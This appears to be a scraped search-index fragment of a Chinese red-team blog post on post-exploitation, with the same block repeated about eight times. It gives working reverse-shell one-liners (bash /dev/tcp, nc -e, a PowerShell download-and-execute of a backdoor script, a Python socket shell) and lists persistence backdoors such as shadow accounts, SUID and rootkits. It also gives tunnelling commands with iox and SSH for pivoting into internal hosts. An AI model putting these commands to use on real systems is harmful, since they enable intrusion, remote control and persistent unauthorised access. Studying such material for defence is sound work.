socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1反弹shell"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2webshell"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#3系统后门"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#windows"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#linux"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#4利用iis等服务制作后门"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 80 #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务； 4.3 传输层常用隧道IOX github：https://github.com/EddieIvan01/iox 使用，比如我们将内网的3389端口转发到我们的attackhost： target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 #-k启用加密 vps:./iox fwd -l *8888 -l 33890 -k 656565 socks代理 修改/etc/proxychains.conf 在本地0.0.0.0:1080启动Socks5服务 ./iox proxy -l 1080 在被控机开启Socks5服务，将服务转发到公网attackhost 在attackhost上转发0.0.0.0:9999到0.0.0.0:1080 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -r 1.1.1.1:9999 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 接着连接内网主机 # proxychains.conf # socks5://1.1.1.1:1080 ​ $ proxychains rdesktop 192.168.0.100:3389 4.4 应用层常用隧道SSH ssh常用参数： -C 压缩传输 -f 后台执行SSH -N 建立静默连接 -g 允许远程主机连接本地用于转发的端口 -L 本地端口转发 -R 远程端口转发 -D 动态转发 -P 指定SSH端口 本地端口转发 攻击机：192.168.1.1 web服务器：192.168.1.2 数据库服务器：192.168.1.3 攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景 攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22 攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 远程转发 攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口 在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1 此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面 动态转发 ① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2 ② 本地设置socks代理后即可访问数据库服务器 4.5 DNS（iodine）要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined； ","date":"2023-11-17","objectID":"/hvv_post_penetration/:3:0","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#41-探测是否出网"},{"categories":["hvv"],"content":"\r权限维持\r1.反弹shell nc attackhost:nc -lvp 9999 target:/bin/bash -i \u0026\u003e /dev/tcp/192.168.0.198/9999 \u003c\u00261 netcat nc -e /bin/bash 192.168.0.198 9999 powershell 将ps1放到attackhost上 powershell.exe -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2.webshell① 内存马隐藏 ② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合 3.系统后门\rWindows① 利用任务计划定时反弹会话 ② 利用开机启动项 ③ 影子账户以及guest账户 ④ 注册表 ⑤ 系统工具后门（shift后门） ⑥ WMI后门 ⑦ DLL劫持 ⑧ 进程注入 Linux① ssh、openssh后门 ② 任务计划 ③ VIM后门 ④ 添加超级用户 ⑤ SUID后门 ⑥ 利用自启动程序 ⑦ rootkit后门 4.利用IIS等服务制作后门常用隧道建立工具 4.1 探测是否出网 ICMP：ping IP； TCP：nc -zv ip 端口； HTTP：curl www.xxx； DNS：nslookup [www.baidu.com] 4.2 网络层常用隧道IPv6隧道 kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。 使用： 首先开启目标机上的IPV6,ipconfig查看ipv6地址 kali：6tunnel -4 80 targetipv6IP 